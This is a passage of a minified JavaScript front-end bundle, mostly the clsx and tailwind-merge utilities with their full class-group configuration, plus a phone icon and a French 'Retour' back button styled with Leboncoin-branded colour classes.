 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const pp = vr("Phone", [["path", {
    d: "M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z",
    key: "foiqr5"
}]])
  , Ht = ({onClick: e}) => u.jsx("button", {
    onClick: e,
    className: "text-leboncoin hover:text-leboncoin-hover transition-colors p-2",
    "aria-label": "Retour",
    children: u.jsx(ap, {
        size: 24
    })
});
function zc(e) {
    var t, n, r = "";
    if (typeof e == "string" || typeof e == "number")
        r += e;
    else if (typeof e == "object")
        if (Array.isArray(e)) {
            var l = e.length;
            for (t = 0; t < l; t++)
                e[t] && (n = zc(e[t])) && (r && (r += " "),
                r += n)
        } else
            for (n in e)
                e[n] && (r && (r += " "),
                r += n);
    return r
}
function mp() {
    for (var e, t, n = 0, r = "", l = arguments.length; n < l; n++)
        (e = arguments[n]) && (t = zc(e)) && (r && (r += " "),
        r += t);
    return r
}
const ts = "-"
  , hp = e => {
    const t = vp(e)
      , {conflictingClassGroups: n, conflictingClassGroupModifiers: r} = e;
    return {
        getClassGroupId: i => {
            const s = i.split(ts);
            return s[0] === "" && s.length !== 1 && s.shift(),
            Pc(s, t) || gp(i)
        }
        ,
        getConflictingClassGroupIds: (i, s) => {
            const a = n[i] || [];
            return s && r[i] ? [...a, ...r[i]] : a
        }
    }
}
  , Pc = (e, t) => {
    var i;
    if (e.length === 0)
        return t.classGroupId;
    const n = e[0]
      , r = t.nextPart.get(n)
      , l = r ? Pc(e.slice(1), r) : void 0;
    if (l)
        return l;
    if (t.validators.length === 0)
        return;
    const o = e.join(ts);
    return (i = t.validators.find( ({validator: s}) => s(o))) == null ? void 0 : i.classGroupId
}
  , du = /^\[(.+)\]$/
  , gp = e => {
    if (du.test(e)) {
        const t = du.exec(e)[1]
          , n = t == null ? void 0 : t.substring(0, t.indexOf(":"));
        if (n)
            return "arbitrary.." + n
    }
}
  , vp = e => {
    const {theme: t, prefix: n} = e
      , r = {
        nextPart: new Map,
        validators: []
    };
    return xp(Object.entries(e.classGroups), n).forEach( ([o,i]) => {
        ii(i, r, o, t)
    }
    ),
    r
}
  , ii = (e, t, n, r) => {
    e.forEach(l => {
        if (typeof l == "string") {
            const o = l === "" ? t : fu(t, l);
            o.classGroupId = n;
            return
        }
        if (typeof l == "function") {
            if (yp(l)) {
                ii(l(r), t, n, r);
                return
            }
            t.validators.push({
                validator: l,
                classGroupId: n
            });
            return
        }
        Object.entries(l).forEach( ([o,i]) => {
            ii(i, fu(t, o), n, r)
        }
        )
    }
    )
}
  , fu = (e, t) => {
    let n = e;
    return t.split(ts).forEach(r => {
        n.nextPart.has(r) || n.nextPart.set(r, {
            nextPart: new Map,
            validators: []
        }),
        n = n.nextPart.get(r)
    }
    ),
    n
}
  , yp = e => e.isThemeGetter
  , xp = (e, t) => t ? e.map( ([n,r]) => {
    const l = r.map(o => typeof o == "string" ? t + o : typeof o == "object" ? Object.fromEntries(Object.entries(o).map( ([i,s]) => [t + i, s])) : o);
    return [n, l]
}
) : e
  , wp = e => {
    if (e < 1)
        return {
            get: () => {}
            ,
            set: () => {}
        };
    let t = 0
      , n = new Map
      , r = new Map;
    const l = (o, i) => {
        n.set(o, i),
        t++,
        t > e && (t = 0,
        r = n,
        n = new Map)
    }
    ;
    return {
        get(o) {
            let i = n.get(o);
            if (i !== void 0)
                return i;
            if ((i = r.get(o)) !== void 0)
                return l(o, i),
                i
        },
        set(o, i) {
            n.has(o) ? n.set(o, i) : l(o, i)
        }
    }
}
  , Lc = "!"
  , kp = e => {
    const {separator: t, experimentalParseClassName: n} = e
      , r = t.length === 1
      , l = t[0]
      , o = t.length
      , i = s => {
        const a = [];
        let d = 0, h = 0, g;
        for (let N = 0; N < s.length; N++) {
            let f = s[N];
            if (d === 0) {
                if (f === l && (r || s.slice(N, N + o) === t)) {
                    a.push(s.slice(h, N)),
                    h = N + o;
                    continue
                }
                if (f === "/") {
                    g = N;
                    continue
                }
            }
            f === "[" ? d++ : f === "]" && d--
        }
        const m = a.length === 0 ? s : s.substring(h)
          , x = m.startsWith(Lc)
          , w = x ? m.substring(1) : m
          , v = g && g > h ? g - h : void 0;
        return {
            modifiers: a,
            hasImportantModifier: x,
            baseClassName: w,
            maybePostfixModifierPosition: v
        }
    }
    ;
    return n ? s => n({
        className: s,
        parseClassName: i
    }) : i
}
  , Sp = e => {
    if (e.length <= 1)
        return e;
    const t = [];
    let n = [];
    return e.forEach(r => {
        r[0] === "[" ? (t.push(...n.sort(), r),
        n = []) : n.push(r)
    }
    ),
    t.push(...n.sort()),
    t
}
  , Np = e => ({
    cache: wp(e.cacheSize),
    parseClassName: kp(e),
    ...hp(e)
})
  , jp = /\s+/
  , Cp = (e, t) => {
    const {parseClassName: n, getClassGroupId: r, getConflictingClassGroupIds: l} = t
      , o = []
      , i = e.trim().split(jp);
    let s = "";
    for (let a = i.length - 1; a >= 0; a -= 1) {
        const d = i[a]
          , {modifiers: h, hasImportantModifier: g, baseClassName: m, maybePostfixModifierPosition: x} = n(d);
        let w = !!x
          , v = r(w ? m.substring(0, x) : m);
        if (!v) {
            if (!w) {
                s = d + (s.length > 0 ? " " + s : s);
                continue
            }
            if (v = r(m),
            !v) {
                s = d + (s.length > 0 ? " " + s : s);
                continue
            }
            w = !1
        }
        const N = Sp(h).join(":")
          , f = g ? N + Lc : N
          , c = f + v;
        if (o.includes(c))
            continue;
        o.push(c);
        const p = l(v, w);
        for (let y = 0; y < p.length; ++y) {
            const k = p[y];
            o.push(f + k)
        }
        s = d + (s.length > 0 ? " " + s : s)
    }
    return s
}
;
function Ep() {
    let e = 0, t, n, r = "";
    for (; e < arguments.length; )
        (t = arguments[e++]) && (n = Tc(t)) && (r && (r += " "),
        r += n);
    return r
}
const Tc = e => {
    if (typeof e == "string")
        return e;
    let t, n = "";
    for (let r = 0; r < e.length; r++)
        e[r] && (t = Tc(e[r])) && (n && (n += " "),
        n += t);
    return n
}
;
function _p(e, ...t) {
    let n, r, l, o = i;
    function i(a) {
        const d = t.reduce( (h, g) => g(h), e());
        return n = Np(d),
        r = n.cache.get,
        l = n.cache.set,
        o = s,
        s(a)
    }
    function s(a) {
        const d = r(a);
        if (d)
            return d;
        const h = Cp(a, n);
        return l(a, h),
        h
    }
    return function() {
        return o(Ep.apply(null, arguments))
    }
}
const U = e => {
    const t = n => n[e] || [];
    return t.isThemeGetter = !0,
    t
}
  , Mc = /^\[(?:([a-z-]+):)?(.+)\]$/i
  , zp = /^\d+\/\d+$/
  , Pp = new Set(["px", "full", "screen"])
  , Lp = /^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/
  , Tp = /\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/
  , Mp = /^(rgba?|hsla?|hwb|(ok)?(lab|lch))\(.+\)$/
  , Rp = /^(inset_)?-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/
  , Ip = /^(url|image|image-set|cross-fade|element|(repeating-)?(linear|radial|conic)-gradient)\(.+\)$/
  , Qe = e => mn(e) || Pp.has(e) || zp.test(e)
  , it = e => Cn(e, "length", bp)
  , mn = e => !!e && !Number.isNaN(Number(e))
  , po = e => Cn(e, "number", mn)
  , In = e => !!e && Number.isInteger(Number(e))
  , Op = e => e.endsWith("%") && mn(e.slice(0, -1))
  , M = e => Mc.test(e)
  , st = e => Lp.test(e)
  , Dp = new Set(["length", "size", "percentage"])
  , Ap = e => Cn(e, Dp, Rc)
  , Fp = e => Cn(e, "position", Rc)
  , Bp = new Set(["image", "url"])
  , $p = e => Cn(e, Bp, Wp)
  , Up = e => Cn(e, "", Vp)
  , On = () => !0
  , Cn = (e, t, n) => {
    const r = Mc.exec(e);
    return r ? r[1] ? typeof t == "string" ? r[1] === t : t.has(r[1]) : n(r[2]) : !1
}
  , bp = e => Tp.test(e) && !Mp.test(e)
  , Rc = () => !1
  , Vp = e => Rp.test(e)
  , Wp = e => Ip.test(e)
  , Hp = () => {
    const e = U("colors")
      , t = U("spacing")
      , n = U("blur")
      , r = U("brightness")
      , l = U("borderColor")
      , o = U("borderRadius")
      , i = U("borderSpacing")
      , s = U("borderWidth")
      , a = U("contrast")
      , d = U("grayscale")
      , h = U("hueRotate")
      , g = U("invert")
      , m = U("gap")
      , x = U("gradientColorStops")
      , w = U("gradientColorStopPositions")
      , v = U("inset")
      , N = U("margin")
      , f = U("opacity")
      , c = U("padding")
      , p = U("saturate")
      , y = U("scale")
      , k = U("sepia")
      , j = U("skew")
      , C = U("space")
      , z = U("translate")
      , F = () => ["auto", "contain", "none"]
      , L = () => ["auto", "hidden", "clip", "visible", "scroll"]
      , se = () => ["auto", M, t]
      , D = () => [M, t]
      , Re = () => ["", Qe, it]
      , zt = () => ["auto", mn, M]
      , yr = () => ["bottom", "center", "left", "left-bottom", "left-top", "right", "right-bottom", "right-top", "top"]
      , lt = () => ["solid", "dashed", "dotted", "double", "none"]
      , Qt = () => ["normal", "multiply", "screen", "overlay", "darken", "lighten", "color-dodge", "color-burn", "hard-light", "soft-light", "difference", "exclusion", "hue", "saturation", "color", "luminosity"]
      , E = () => ["start", "end", "center", "between", "around", "evenly", "stretch"]
      , P = () => ["", "0", M]
      , T = () => ["auto", "avoid", "all", "avoid-page", "page", "left", "right", "column"]
      , A = () => [mn, M];
    return {
        cacheSize: 500,
        separator: ":",
        theme: {
            colors: [On],
            spacing: [Qe, it],
            blur: ["none", "", st, M],
            brightness: A(),
            borderColor: [e],
            borderRadius: ["none", "", "full", st, M],
            borderSpacing: D(),
            borderWidth: Re(),
            contrast: A(),
            grayscale: P(),
            hueRotate: A(),
            invert: P(),
            gap: D(),
            gradientColorStops: [e],
            gradientColorStopPositions: [Op, it],
            inset: se(),
            margin: se(),
            opacity: A(),
            padding: D(),
            saturate: A(),
            scale: A(),
            sepia: P(),
            skew: A(),
            space: D(),
            translate: D()
        },
        classGroups: {
            aspect: [{
                aspect: ["auto", "square", "video", M]
            }],
            container: ["container"],
            columns: [{
                columns: [st]
            }],
            "break-after": [{
                "break-after": T()
            }],
            "break-before": [{
                "break-before": T()
            }],
            "break-inside": [{
                "break-inside": ["auto", "avoid", "avoid-page", "avoid-column"]
            }],
            "box-decoration": [{
                "box-decoration": ["slice", "clone"]
            }],
            box: [{
                box: ["border", "content"]
            }],
            display: ["block", "inline-block", "inline", "flex", "inline-flex", "table", "inline-table", "table-caption", "table-cell", "table-column", "table-column-group", "table-footer-group", "table-header-group", "table-row-group", "table-row", "flow-root", "grid", "inline-grid", "contents", "list-item", "hidden"],
            float: [{
                float: ["right", "left", "none", "start", "end"]
            }],
            clear: [{
                clear: ["left", "right", "both", "none", "start", "end"]
            }],
            isolation: ["isolate", "isolation-auto"],
            "object-fit": [{
                object: ["contain", "cover", "fill", "none", "scale-down"]
            }],
            "object-position": [{
                object: [...yr(), M]
            }],
            overflow: [{
                overflow: L()
            }],
            "overflow-x": [{
                "overflow-x": L()
            }],
            "overflow-y": [{
                "overflow-y": L()
            }],
            overscroll: [{
                overscroll: F()
            }],
            "overscroll-x": [{
                "overscroll-x": F()
            }],
            "overscroll-y": [{
                "overscroll-y": F()
            }],
            position: ["static", "fixed", "absolute", "relative", "sticky"],
            inset: [{
                inset: [v]
            }],
            "inset-x": [{
                "inset-x": [v]
            }],
            "inset-y": [{
                "inset-y": [v]
            }],
            start: [{
                start: [v]
            }],
            end: [{
                end: [v]
            }],
            top: [{
                top: [v]
            }],
            right: [{
                right: [v]
            }],
            bottom: [{
                bottom: [v]
            }],
            left: [{
                left: [v]
            }],
            visibility: ["visible", "invisible", "collapse"],
            z: [{
                z: ["auto", In, M]
            }],
            basis: [{
                basis: se()
            }],
            "flex-direction": [{
                flex: ["row", "row-reverse", "col", "col-reverse"]
            }],
            "flex-wrap": [{
                flex: ["wrap", "wrap-reverse", "nowrap"]
            }],
            flex: [{
                flex: ["1", "auto", "initial", "none", M]
            }],
            grow: [{
                grow: P()
            }],
            shrink: [{
                shrink: P()
            }],
            order: [{
                order: ["first", "last", "none", In, M]
            }],
            "grid-cols": [{
                "grid-cols": [On]
            }],
            "col-start-end": [{
                col: ["auto", {
                    span: ["full", In, M]
                }, M]
            }],
            "col-start": [{
                "col-start": zt()
            }],
            "col-end": [{
                "col-end": zt()
            }],
            "grid-rows": [{
                "grid-rows": [On]
            }],
            "row-start-end": [{
                row: ["auto", {
                    span: [In, M]
                }, M]
            }],
            "row-start": [{
                "row-start": zt()
            }],
            "row-end": [{
                "row-end": zt()
            }],
            "grid-flow": [{
                "grid-flow": ["row", "col", "dense", "row-dense", "col-dense"]
            }],
            "auto-cols": [{
                "auto-cols": ["auto", "min", "max", "fr", M]
            }],
            "auto-rows": [{
                "auto-rows": ["auto", "min", "max", "fr", M]
            }],
            gap: [{
                gap: [m]
            }],
            "gap-x": [{
                "gap-x": [m]
            }],
            "gap-y": [{
                "gap-y": [m]
            }],
            "justify-content": [{
                justify: ["normal", ...E()]
            }],
            "justify-items": [{
                "justify-items": ["start", "end", "center", "stretch"]
            }],
            "justify-self": [{
                "justify-self": ["auto", "start", "end", "center", "stretch"]
            }],
            "align-content": [{
                content: ["normal", ...E(), "baseline"]
            }],
            "align-items": [{
                items: ["start", "end", "center", "baseline", "stretch"]
            }],
            "align-self": [{
                self: ["auto", "start", "end", "center", "stretch", "baseline"]
            }],
            "place-content": [{
                "place-content": [...E(), "baseline"]
            }],
            "place-items": [{
                "place-items": ["start", "end", "center", "baseline", "stretch"]
            }],
            "place-self": [{
                "place-self": ["auto", "start", "end", "center", "stretch"]
            }],
            p: [{
                p: [c]
            }],
            px: [{
                px: [c]
            }],
            py: [{
                py: [c]
            }],
            ps: [{
                ps: [c]
            }],
            pe: [{
                pe: [c]
            }],
            pt: [{
                pt: [c]
            }],
            pr: [{
                pr: [c]
            }],
            pb: [{
                pb: [c]
            }],
            pl: [{
                pl: [c]
            }],
            m: [{
                m: [N]
            }],
            mx: [{
                mx: [N]
            }],
            my: [{
                my: [N]
            }],
            ms: [{
                ms: [N]
            }],
            me: [{
                me: [N]
            }],
            mt: [{
                mt: [N]
            }],
            mr: [{
                mr: [N]
            }],
            mb: [{
                mb: [N]
            }],
            ml: [{
                ml: [N]
            }],
            "space-x": [{
                "space-x": [C]
            }],
            "space-x-reverse": ["space-x-reverse"],
            "space-y": [{
                "space-y": [C]
            }],
            "space-y-reverse": ["space-y-reverse"],
            w: [{
                w: ["auto", "min", "max", "fit", "svw", "lvw", "dvw", M, t]
            }],
            "min-w": [{
                "min-w": [M, t, "min", "max", "fit"]
            }],
            "max-w": [{
                "max-w": [M, t, "none", "full", "min", "max", "fit", "prose", {
                    screen: [st]
                }, st]
            }],
            h: [{
                h: [M, t, "auto", "min", "max", "fit", "svh", "lvh", "dvh"]
            }],
            "min-h": [{
                "min-h": [M, t, "min", "max", "fit", "svh", "lvh", "dvh"]
            }],
            "max-h": [{
                "max-h": [M, t, "min", "max", "fit", "svh", "lvh", "dvh"]
            }],
            size: [{
                size: [M, t, "auto", "min", "max", "fit"]
            }],
            "font-size": [{
                text: ["base", st, it]
            }],
            "font-smoothing": ["antialiased", "subpixel-antialiased"],
            "font-style": ["italic", "not-italic"],
            "font-weight": [{
                font: ["thin", "extralight", "light", "normal", "medium", "semibold", "bold", "extrabold", "black", po]
            }],
            "font-family": [{
                font: [On]
            }],
            "fvn-normal": ["normal-nums"],
            "fvn-ordinal": ["ordinal"],
            "fvn-slashed-zero": ["slashed-zero"],
            "fvn-figure": ["lining-nums", "oldstyle-nums"],
            "fvn-spacing": ["proportional-nums", "tabular-nums"],
            "fvn-fraction": ["diagonal-fractions", "stacked-fractions"],
            tracking: [{
                tracking: ["tighter", "tight", "normal", "wide", "wider", "widest", M]
            }],
            "line-clamp": [{
                "line-clamp": ["none", mn, po]
            }],
            leading: [{
                leading: ["none", "tight", "snug", "normal", "relaxed", "loose", Qe, M]
            }],
            "list-image": [{
                "list-image": ["none", M]
            }],
            "list-style-type": [{
                list: ["none", "disc", "decimal", M]
            }],
            "list-style-position": [{
                list: ["inside", "outside"]
            }],
            "placeholder-color": [{
                placeholder: [e]
            }],
            "placeholder-opacity": [{
                "placeholder-opacity": [f]
            }],
            "text-alignment": [{
                text: ["left", "center", "right", "justify", "start", "end"]
            }],
            "text-color": [{
                text: [e]
            }],
            "text-opacity": [{
                "text-opacity": [f]
            }],
            "text-decoration": ["underline", "overline", "line-through", "no-underline"],
            "text-decoration-style": [{
                decoration: [...lt(), "wavy"]
            }],
            "text-decoration-thickness": [{
                decoration: ["auto", "from-font", Qe, it]
            }],
            "underline-offset": [{
                "underline-offset": ["auto", Qe, M]
            }],
            "text-decoration-color": [{
                decoration: [e]
            }],
            "text-transform": ["uppercase", "lowercase", "capitalize", "normal-case"],
            "text-overflow": ["truncate", "text-ellipsis", "text-clip"],
            "text-wrap": [{
                text: ["wrap", "nowrap", "balance", "pretty"]
            }],
            indent: [{
                indent: D()
            }],
            "vertical-align": [{
                align: ["baseline", "top", "middle", "bottom", "text-top", "text-bottom", "sub", "super", M]
            }],
            whitespace: [{
                whitespace: ["normal", "nowrap", "pre", "pre-line", "pre-wrap", "break-spaces"]
            }],
            break: [{
                break: ["normal", "words", "all", "keep"]
            }],
            hyphens: [{
                hyphens: ["none", "manual", "auto"]
            }],
            content: [{
                content: ["none", M]
            }],
            "bg-attachment": [{
                bg: ["fixed", "local", "scroll"]
            }],
            "bg-clip": [{
                "bg-clip": ["border", "padding", "content", "text"]
            }],
            "bg-opacity": [{
                "bg-opacity": [f]
            }],
            "bg-origin": [{
                "bg-origin": ["border", "padding", "content"]
            }],
            "bg-position": [{
                bg: [...yr(), Fp]
            }],
            "bg-repeat": [{
                bg: ["no-repeat", {
                    repeat: ["", "x", "y", "round", "space"]
                }]
            }],
            "bg-size": [{
                bg: ["auto", "cover", "contain", Ap]
            }],
            "bg-image": [{
                bg: ["none", {
                    "gradient-to": ["t", "tr", "r", "br", "b", "bl", "l", "tl"]
                }, $p]
            }],
            "bg-color": [{
                bg: [e]
            }],
            "gradient-from-pos": [{
                from: [w]
            }],
            "gradient-via-pos": [{
                via: [w]
            }],
            "gradient-to-pos": [{
                to: [w]
            }],
            "gradient-from": [{
                from: [x]
            }],
            "gradient-via": [{
                via: [x]
            }],
            "gradient-to": [{
                to: [x]
            }],
            rounded: [{
                rounded: [o]
            }],
            "rounded-s": [{
                "rounded-s": [o]
            }],
            "rounded-e": [{
                "rounded-e": [o]
            }],
            "rounded-t": [{
                "rounded-t": [o]
            }],
            "rounded-r": [{
                "rounded-r": [o]
            }],
            "rounded-b": [{
                "rounded-b": [o]
            }],
            "rounded-l": [{
                "rounded-l": [o]
            }],
            "rounded-ss": [{
                "rounded-ss": [o]
            }],
            "rounded-se": [{
                "rounded-se": [o]
            }],
            "rounded-ee": [{
                "rounded-ee": [o]
            }],
            "rounded-es": [{
                "rounded-es": [o]
            }],
            "rounded-tl": [{
                "rounded-tl": [o]
            }],
            "rounded-tr": [{
                "rounded-tr": [o]
            }],
            "rounded-br": [{
                "rounded-br": [o]
            }],
            "rounded-bl": [{
                "rounded-bl": [o]
            }],
            "border-w": [{
                border: [s]
            }],
            "border-w-x": [{
                "border-x": [s]
            }],
            "border-w-y": [{
                "border-y": [s]
            }],
            "border-w-s": [{
                "border-s": [s]
            }],
            "border-w-e": [{
                "border-e": [s]
            }],
            "border-w-t": [{
                "border-t": [s]
            }],
            "border-w-r": [{
                "border-r": [s]
            }],
            "border-w-b": [{
                "border-b": [s]
            }],
            "border-w-l": [{
                "border-l": [s]
            }],
            "border-opacity": [{
                "border-opacity": [f]
            }],
            "border-style": [{
                border: [...lt(), "hidden"]
            }],
            "divide-x": [{
                "divide-x": [s]
            }],
            "divide-x-reverse": ["divide-x-reverse"],
            "divide-y": [{
                "divide-y": [s]
            }],
            "divide-y-reverse": ["divide-y-reverse"],
            "divide-opacity": [{
                "divide-opacity": [f]
            }],
            "divide-style": [{
                divide: lt()
            }],
            "border-color": [{
                border: [l]
            }],
            "border-color-x": [{
                "border-x": [l]
            }],
            "border-color-y": [{
                "border-y": [l]
            }],
            "border-color-s": [{
                "border-s": [l]
            }],
            "border-color-e": [{
                "border-e": [l]
            }],
            "border-color-t": [{
                "border-t": [l]
            }],
            "border-color-r": [{
                "border-r": [l]
            }],
            "border-color-b": [{
                "border-b": [l]
            }],
            "border-color-l": [{
                "border-l": [l]
            }],
            "divide-color": [{
                divide: [l]
            }],
            "outline-style": [{
                outline: ["", ...lt()]
            }],
            "outline-offset": [{
                "outline-offset": [Qe, M]
            }],
            "outline-w": [{
                outline: [Qe, it]
            }],
            "outline-color": [{
                outline: [e]
            }],
            "ring-w": [{
                ring: Re()
            }],
            "ring-w-inset": ["ring-inset"],
            "ring-color": [{
                ring: [e]
            }],
            "ring-opacity": [{
                "ring-opacity": [f]
            }],
            "ring-offset-w": [{
                "ring-offset": [Qe, it]
            }],
            "ring-offset-color": [{
                "ring-offset": [e]
            }],
            shadow: [{
                shadow: ["", "inner", "none", st, Up]
            }],
            "shadow-color": [{
                shadow: [On]
            }],
            opacity: [{
                opacity: [f]
            }],
            "mix-blend": [{
                "mix-blend": [...Qt(), "plus-lighter", "plus-darker"]
            }],
            "bg-blend": [{
                "bg-blend": Qt()
            }],
            filter: [{
                filter: ["", "none"]
            }],
            blur: [{
                blur: [n]
            }],
            brightness: [{
                brightness: [r]
            }],
            contrast: [{
                contrast: [a]
            }],
            "drop-shadow": [{
                "drop-shadow": ["", "none", st, M]
            }],
            grayscale: [{
                grayscale: [d]
            }],
            "hue-rotate": [{
                "hue-rotate": [h]
            }],
            invert: [{
                invert: [g]
            }],
            saturate: [{
                saturate: [p]
            }],
            sepia: [{
                sepia: [k]
            }],
            "backdrop-filter": [{
                "backdrop-filter": ["", "none"]
            }],
            "backdrop-blur": [{
                "backdrop-blur": [n]
            }],
            "backdrop-brightness": [{
                "backdrop-brightness": [r]
            }],
            "backdrop-contrast": [{
                "backdrop-contrast": [a]
            }],
            "backdrop-grayscale": [{
                "backdrop-grayscale": [d]
            }],
            "backdrop-hue-rotate": [{
                "backdrop-hue-rotate": [h]
            }],
            "backdrop-invert": [{
                "backdrop-invert": [g]
            }],
            "backdrop-opacity": [{
                "backdrop-opacity": [f]
            }],
            "backdrop-saturate": [{
                "backdrop-saturate": [p]
            }],
            "backdrop-sepia": [{
                "backdrop-sepia": [k]
            }],
            "border-collapse": [{
                border: ["collapse", "separate"]
            }],
            "border-spacing": [{
                "border-spacing": [i]
            }],
            "border-spacing-x": [{
                "border-spacing-x": [i]
            }],
            "border-spacing-y": [{
                "border-spacing-y": [i]
            }],
            "table-layout": [{
                table: ["auto", "fixed"]
            }],
            caption: [{
                caption: ["top", "bottom"]
            }],
            transition: [{
                transition: ["none", "all", "", "colors", "opacity", "shadow", "transform", M]
            }],
            duration: [{
                duration: A()
            }],
            ease: [{
                ease: ["linear", "in", "out", "in-out", M]
            }],
            delay: [{
                delay: A()
            }],
            animate: [{
                animate: ["none", "spin", "ping", "pulse", "bounce", M]
            }],
            transform: [{
                transform: ["", "gpu", "none"]
            }],
            scale: [{
                scale: [y]
            }],
            "scale-x": [{
                "scale-x": [y]
            }],
            "scale-y": [{
                "scale-y": [y]
            }],
            rotate: [{
                rotate: [In, M]
            }],
            "translate-x": [{
                "translate-x": [z]
            }],
            "translate-y": [{
                "translate-y": [z]
            }],
            "skew-x": [{
                "skew-x": [j]
            }],
            "skew-y": [{
                "skew-y": [j]
            }],
            "transform-origin": [{
                origin: ["center", "top", "top-right", "right", "bottom-right", "bottom", "bottom-left", "left", "top-left", M]
            }],
            accent: [{
                accent: ["auto", e]
            }],
            appearance: [{
                appearance: ["none", "auto"]
            }],
            cursor: [{
                cursor: ["auto", "default", "pointer", "wait", "text", "move", "help", "not-allowed", "none", "context-menu", "progress", "cell", "crosshair", "vertical-text", "alias", "copy", "no-drop", "grab", "grabbing", "all-scroll", "col-resize", "row-resize", "n-resize", "e-resize", "s-resize", "w-resize", "ne-resize", "nw-resize", "se-resize", "sw-resize", "ew-resize", "ns-resize", "nesw-resize", "nwse-resize", "zoom-in", "zoom-out", M]
            }],
            "caret-color": [{
                caret: [e]
            }],
            "pointer-events": [{
                "pointer-events": ["none", "auto"]
            }],
            resize: [{
                resize: ["none", "y", "x", ""]
            }],
            "scroll-behavior": [{
                scroll: ["auto", "smooth"]
            }],
            "scroll-m": [{
                "scroll-m": D()
            }],
            "scroll-mx": [{
                "scroll-mx": D()
            }],
            "scroll-my": [{
                "scroll-my": D()
            }],
            "scroll-ms": [{
                "scroll-ms": D()
            }],
            "scroll-me": [{
                "scroll-me": D()
            }],
            "scroll-mt": [{
                "scroll-mt": D()
            }],
            "scroll-mr": [{
                "scroll-mr": D()
            }],
            "scroll-mb": [{
                "scroll-mb": D()
            }],
            "scroll-ml": [{
                "scroll-ml": D()
            }],
            "scroll-p": [{
                "scroll-p": D()
            }],
            "scroll-px": [{
                "scroll-px": D()
            }],
            "scroll-py": [{
                "scroll-py": D()
            }],
            "scroll-ps": [{
                "scroll-ps": D()
            }],
            "scroll-pe": [{
                "scroll-pe": D()
            }],
            "scroll-pt": [{
                "scroll-pt": D()
            }],
            "scroll-pr": [{
                "scroll-pr": D()
            }],
            "scroll-pb": [{
                "scroll-pb": D()
            }],
            "scroll-pl": [{
                "scroll-pl": D()
            }],
            "snap-align": [{
                snap: ["start", "end", "center", "align-none"]
            }],
            "snap-stop": [{
                snap: ["normal", "always"]
            }],
            "snap-type": [{
                snap: ["none", "x", "y", "both"]
            }],
            "snap-strictness": [{
                snap: ["mandatory", "proximity"]
            }],
            touch: [{
                touch: ["auto", "none", "manipulation"]
            }],
            "touch-x": [{
                "touch-pan": ["x", "left", "right"]
            }],
            "touch-y": [{
                "touch-pan": ["y", "up", "down"]
            }],
            "touch-pz": ["touch-pinch-zoom"],
            select: [{
                select: ["none", "text", "all", "auto"]
            }],
            "will-change": [{
                "will-change": ["auto", "scroll", "contents", "transform", M]
            }],
            fill: [{
                fill: [e, "none"]
            }],
            "stroke-w": [{
                stroke: [Qe, it, po]
            }],
            stroke: [{
                stroke: [e, "none"]
            }],
            sr: ["sr-only", "not-sr-only"],
            "forced-color-adjust": [{
                "forced-color-adjust": ["auto", "none"]
            }]
        },
        conflictingClassGroups: {
            overflow: ["overflow-x", "overflow-y"],
            overscroll: ["overscroll-x", "overscroll-y"],
            inset: ["inset-x", "inset-y", "start", "end", "top", "right", "bottom", "left"],
            "inset-x": ["right", "left"],
            "inset-y": ["top", "bottom"],
            flex: ["basis", "grow", "shrink"],
            gap: ["gap-x", "gap-y"],
            p: ["px", "py", "ps", "pe", "pt", "pr", "pb", "pl"],
            px: ["pr", "pl"],
            py: ["pt", "pb"],
            m: ["mx", "my", "ms", "me", "mt", "mr", "mb", "ml"],
            mx: ["mr", "ml"],
            my: ["mt", "mb"],
            size: ["w", "h"],
            "font-size": ["leading"],
            "fvn-normal": ["fvn-ordinal", "fvn-slashed-zero", "fvn-figure", "fvn-spacing", "fvn-fraction"],
            "fvn-ordinal": ["fvn-normal"],
            "fvn-slashed-zero": ["fvn-normal"],
            "fvn-figure": ["fvn-normal"],
            "fvn-spacing": ["fvn-normal"],
            "fvn-fraction": ["fvn-normal"],
            "line-clamp": ["display", "overflow"],
            rounded: ["rounded-s", "rounded-e", "rounded-t", "rounded-r", "rounded-b", "rounded-l", "rounded-ss", "rounded-se", "rounded-ee", "rounded-es", "rounded-tl", "rounded-tr", "rounded-br", "rounded-bl"],
            "rounded-s": ["rounded-ss", "rounded-es"],
            "rounded-e": ["rounded-se", "rounded-ee"],
            "rounded-t": ["rounded-tl", "rounded-tr"],
            "rounded-r": ["rounded-tr", "rounded-br"],
            "rounded-b": ["rounded-br", "rounded-bl"],
            "rounded-l": ["rounded-tl", "rounded-bl"],
            "border-spacing": ["border-spacing-x", "border-spacing-y"],
            "border-w": ["border-w-s", "border-w-e", "border-w-t", "border-w-r", "border-w-b", "border-w-l"],
            "border-w-x": ["border-w-r", "border-w-l"],
            "border-w-y": ["border-w-t", "border-w-b"],
            "border-color": ["border-color-s", "border-color-e", "border-color-t", "border-color-r", "border-color-b", "border-color-l"],
            "border-color-x": ["border-color-r", "border-color-l"],
            "border-color-y": ["border-color-t", "border-color-b"],
            "scroll-m": ["scroll-mx", "scroll-my", "scroll-ms", "scroll-me", "scroll-mt", "scroll-mr", "scroll-mb", "scroll-ml"],
            "scroll-mx": ["scroll-mr", "scroll-ml"],
            "scroll-my": ["scroll-mt", "scroll-mb"],
            "scroll-p": ["scroll-px", "scroll-py", "scroll-ps", "scroll-pe", "scroll-pt", "scroll-pr", "scroll-pb", "scroll-pl"],
            "scroll-px": ["scroll-pr", "scroll-pl"],
            "scroll-py": ["scroll-pt", "scroll-pb"],
            touch: ["touch-x", "touch-y", "touch-pz"],
            "touch-x": ["touch"],
            "touch-y": ["touch"],
            "touch-pz": ["touch"]
        },
        conflictingClassGroupModifiers: {
            "font-size": ["leading"]
        }
    }
}
  , Qp = _p(Hp);
function Al(...e) {
    return Qp(mp(e))
}
